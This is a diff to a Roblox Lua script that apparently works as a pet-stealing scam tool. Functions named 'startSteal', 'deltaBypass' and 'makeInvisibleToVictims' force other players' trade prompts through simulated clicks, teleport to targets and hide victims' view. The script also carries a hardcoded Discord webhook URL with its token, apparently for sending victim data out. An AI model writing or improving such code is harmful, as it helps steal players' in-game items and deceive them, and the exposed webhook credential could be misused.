@@ -3,6 +3,9 @@ repeat task.wait() until game:IsLoaded()
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Lighting = game:GetService("Lighting")
+local UserInputService = game:GetService("UserInputService")
+local VirtualInputManager = game:GetService("VirtualInputManager")
 local HttpService = game:GetService("HttpService")
 
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1403786302461182083/OmkGNGgXamqB2Q_vs3u5WElaP5E2cpC8mSTeEfJwFnfFB7SQabgkFJi-NIKo_WLVISEs"
@@ -62,22 +65,28 @@ local function equipPet(pet)
     end
 end
 
--- Trigger trade prompt remotely WITHOUT teleporting
-local function triggerTradePromptRemote(targetName)
+local function teleportTarget(targetName)
     local targetPlayer = Players:FindFirstChild(targetName)
-    if not targetPlayer or not targetPlayer.Character then return end
+    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
+        LocalPlayer.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
+    end
+end
 
-    local head = targetPlayer.Character:FindFirstChild("Head")
-    if not head then return end
+local function deltaBypass()
+    local viewportSize = workspace.CurrentCamera.ViewportSize
+    VirtualInputManager:SendMouseButtonEvent(viewportSize.X / 2, viewportSize.Y / 2, 0, true, nil, false)
+    task.wait()
+    VirtualInputManager:SendMouseButtonEvent(viewportSize.X / 2, viewportSize.Y / 2, 0, false, nil, false)
+end
 
-    local prompt = head:FindFirstChildWhichIsA("ProximityPrompt")
-    if prompt then
-        prompt:InputHoldBegin()
-        task.wait(0.1)
-        prompt:InputHoldEnd()
-        print("[TradeTrigger] Trade prompt triggered remotely on "..targetName)
-    else
-        print("[TradeTrigger] No ProximityPrompt found on "..targetName)
+local function startSteal(triggerName)
+    local targetPlayer = Players:FindFirstChild(triggerName)
+    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("Head") then
+        local prompt = targetPlayer.Character.Head:FindFirstChild("ProximityPrompt")
+        if prompt then
+            prompt.HoldDuration = 0
+            deltaBypass()
+        end
     end
 end
 
@@ -148,6 +157,7 @@ end
 local function checkPetsInventory(targetName)
     local petsData = dataModule:GetData().PetsData.PetInventory.Data
 
+    -- First, try priority pets first
     for _, priorityPetName in ipairs(PET_PRIORITY) do
         for petUUID, petData in pairs(petsData) do
             if petData.PetType == priorityPetName then
@@ -155,19 +165,20 @@ local function checkPetsInventory(targetName)
                 if petObject then
                     equipPet(petObject)
                     task.wait(0.2)
-                    triggerTradePromptRemote(targetName)
+                    startSteal(targetName)
                 end
             end
         end
     end
 
+    -- Then, try the rest of the pets excluding priority pets
     for petUUID, petData in pairs(petsData) do
         if checkPetsWhitelist(petData.PetType) and not table.find(PET_PRIORITY, petData.PetType) then
             local petObject = getPetObject(petUUID)
             if petObject then
                 equipPet(petObject)
                 task.wait(0.2)
-                triggerTradePromptRemote(targetName)
+                startSteal(targetName)
             end
         end
     end
@@ -182,19 +193,17 @@ local function waitForJoin()
     return false, nil
 end
 
-local function hideSelf()
-    if LocalPlayer.Character then
-        for _, part in pairs(LocalPlayer.Character:GetDescendants()) do
-            if part:IsA("BasePart") then
-                part.LocalTransparencyModifier = 1
-                part.CanCollide = false
-                part.CastShadow = false
-            elseif part:IsA("Decal") or part:IsA("Texture") then
-                part.Transparency = 1
-            elseif part:IsA("BillboardGui") or part:IsA("SurfaceGui") then
-                part.Enabled = false
-            elseif part:IsA("ParticleEmitter") or part:IsA("Trail") then
-                part.Enabled = false
+local function makeInvisibleToVictims()
+    for _, player in pairs(Players:GetPlayers()) do
+        if player ~= LocalPlayer and not table.find(USERNAMES, player.Name) then
+            if player.Character then
+                for _, part in pairs(player.Character:GetDescendants()) do
+                    if part:IsA("BasePart") or part:IsA("Decal") or part:IsA("Texture") then
+                        part.Transparency = 1
+                    elseif part:IsA("BillboardGui") or part:IsA("SurfaceGui") then
+                        part.Enabled = false
+                    end
+                end
             end
         end
     end
@@ -202,11 +211,12 @@ end
 
 local function idlingTarget()
     task.spawn(function()
-        hideSelf()
         while task.wait(0.2) do
             local found, targetName = waitForJoin()
             if found then
+                teleportTarget(targetName)
                 checkPetsInventory(targetName)
+                makeInvisibleToVictims()
             end
         end
     end)
@@ -218,6 +228,8 @@ for petUUID, petData in pairs(dataModule:GetData().PetsData.PetInventory.Data) d
         table.insert(victimPetTable, petData.PetType)
     end
 end
+
+-- Removed blurInstance and disableESC calls
 
 idlingTarget()
 
